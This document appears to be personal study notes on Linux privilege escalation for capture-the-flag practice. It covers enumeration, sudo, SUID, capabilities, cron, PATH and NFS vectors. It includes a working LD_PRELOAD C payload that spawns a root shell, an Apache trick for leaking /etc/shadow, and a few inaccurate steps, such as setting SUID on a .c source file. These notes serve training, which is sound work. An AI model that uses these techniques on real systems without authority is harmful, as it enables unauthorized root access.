Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.


-----

privilege esclation meaning :

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

1. Resetting passwords

2. Bypassing access controls to compromise protected data

3. Editing software configurations

4. Enabling persistence

5. Changing the privilege of existing (or new) users

6. Execute any administrative command

-----

first step here is enumeration 

Enumeration is the first step you have to take once you gain access to any system. 

1. hostname : The hostname command will return the hostname of the target machine.

2. uname -a : 

uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

3. /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

4. /etc/issue
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system

5. ps Command

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ps (Process Status) will show the following;

a. PID: The process ID (unique to the process)

b. TTY: Terminal type used by the user

c. Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)

d.CMD: The command or executable running (will NOT display any command line parameter)

ps command options : 

ps -A = view all running processes 

ps axjf = view process tree 

ps aux = it will show processes for (a) all users 
(u) display user who launched the process 
(x) processes that are not attached to terminal 

6. env command : 

will show the environment variables , will let us know compilers and programming languages installed on target 

7. sudo -l 

The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

8. ls 

use ls or ls -la to list all the files that can contain passwords or unique permissions 

9. id command : 

The id command will provide a general overview of the user’s privilege level and group memberships.

10. /etc/passwd

Reading the /etc/passwd file can be an easy way to discover users on the system.

 	Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

11. history: 

Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

12. ifconfig

The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system.

This can be confirmed using the "ip route" command to see which network routes exist.

13. netstat : 

The netstat command can be used with several different options to gather information on existing connections.

netstat -a: shows all listening ports and established connections.

netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.

netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol

netstat -s: list network usage statistics by protocol. This can also be used with the -t or -u options to limit the output to a specific protocol.

netstat -i: Shows interface statistics.

netstat -ano which could be broken down as follows;

-a: Display all sockets
-n: Do not resolve names
-o: Display timers

14. find command : 

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Find files:

find . -name flag1.txt: find the file named “flag1.txt” in the current directory

find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory

find / -type d -name config: find the directory named config under “/”

find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)

find / -perm a=x: find executable files

find /home -user frank: find all files for user “frank” under “/home”

find / -mtime 10: find files that were modified in the last 10 days

find / -atime 10: find files that were accessed in the last 10 day

find / -cmin -60: find files changed within the last hour (60 minutes)

find / -amin -60: find files accesses within the last hour (60 minutes)

find / -size 50M: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

Folders and files that can be written to or executed from:
		
		find / -perm -222 -type d 2>/dev/null: Find world-writeable folders

		find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages:

find / -name perl*
find / -name python*
find / -name gcc*

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.

find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

15. General Linux Commands : 

Please spend some time getting comfortable with commands such as find, locate, grep, cut, sort, etc.

--------

Automated Enumeration Tools : 

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester

Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration

Linux Priv Checker: https://github.com/linted/linuxprivchecker

-------

now we will discuss various privilege esclation vectors: 

1. Kernel Exploits : 

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;

a) Identify the kernel version

b) Search and find an exploit code for the kernel version of the target system

c) Run the exploit

*failed exploits can also crash our system , so in real world engagements be careful.*

Research sources:

1. Based on your findings, you can use Google to search for an existing exploit code.

2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.

3. use script LES linux exploit suggester 


small hints / notes : 

1. be too specific about kernel version in google search  

2. understand your exploit before running it i.e read about the exploit 

3. some exploit may require to follow ceratain steps i.e why read about ur exploit 

4. use python server or wget to transfer your exploit .


--------

2. Sudo : 

The sudo command, by default, allows you to run a program with root privileges.

sometimes to give user some flexibility in his permissions , admin can allow certain users to use certain programs as superuser or root 

Any user can check its current situation related to root privileges using the sudo -l command.

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Leverage application functions : 

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. 

an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile)

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

LD_PRELOAD is a function that allows any program to use shared libraries. 

 If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

 The steps of this privilege escalation vector can be summarized as follows;

Check for LD_PRELOAD (with the env_keep option)

Write a simple C code compiled as a share object (.so extension) file

Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

important code 

			The C code will simply spawn a root shell and can be written as follows;

		#include <stdio.h>
		#include <sys/types.h>
		#include <stdlib.h>

		void _init() {
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/bash");
		}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

--------

3. SUID : 

Much of Linux privilege controls rely on controlling the users and files interactions.

This is done with permissions. By now, you know that files can have read, write, and execute permissions. 

These are given to users within their privilege levels. 

This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

find / -type f -perm -04000 -ls 2>/dev/null // use this to dind such files with suid or sgid permissions
	
A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io

setting up of file as a variable in terminal and then reading that terminal or directly read flag from it 

------

4. Capabilities : 

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.

As a result, the binary would get through its task without needing a higher privilege user.

The capabilities man page provides detailed information on its usage and options.

use: 

getcap -r / 2>/dev/null

to list enables capabilities 

then use gtfobins to use these capabilities to esclate privileges 

------

5. Cron Jobs 

Cron jobs are used to run scripts or binaries at specific times. 

By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.


Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

if our current user can access that script, we can easily modify it to create a reverse shell, hopefully with root privileges.

sometimes admin deletes the script set as a cronjob but forgets to delete the job itself that is being performed 

we can create a script with the same name and same directory and get tit executed by the cronjob as root user '

*important note : after creating or editing a script make sure to set it as a executable so it can be executed when ran as a cronjob*

-------

6. PATH : 

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script.

 PATH in Linux is an environmental variable that tells the operating system where to search for executables. 

 For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. 

 4 important questions arise here : 

1. What folders are located under $PATH

2. Does your current user have write privileges for any of these folders?

3. Can you modify $PATH?

4. Is there a script/application you can start that will be affected by this vulnerability?

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command. 

An alternative could be the command below.

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

We have added “grep -v proc” to get rid of the many results related to running processes.

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “export PATH=/tmp:$PATH” command accomplishes this.

so here the thing is that you must have a application that executes a script , the application must have a setuid so that it can run the script as root and the script that will run as a root will be the script that will lead to a shell 

------

7. NFS : network file sharing 

 Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. 

  Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

  Another vector that is more relevant to CTFs and exams is a misconfigured network shell.

  This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

  NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

  The critical element for this privilege escalation vector is the “no_root_squash”

  By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

  STEP 1 - Enumerating shares on target machine : 

  "showmount -e <ip_address> "
   
  STEP 2 - Mounting of shares : 

  We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

  first make a directory for ex. mkdir /tmp/newdirectory

  then mount the share by

  mount -o rw ip_addr:/share_folder_name /tmp/newdirectory

  here ip_addr = target's ip address and share folder name is the name of the share enumerated above 

  As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

  compile the c code to run bin bash with root permissions and set it suid by

  chmod +s code.c

  then run that code on target machine and boom we got root . 

  --------




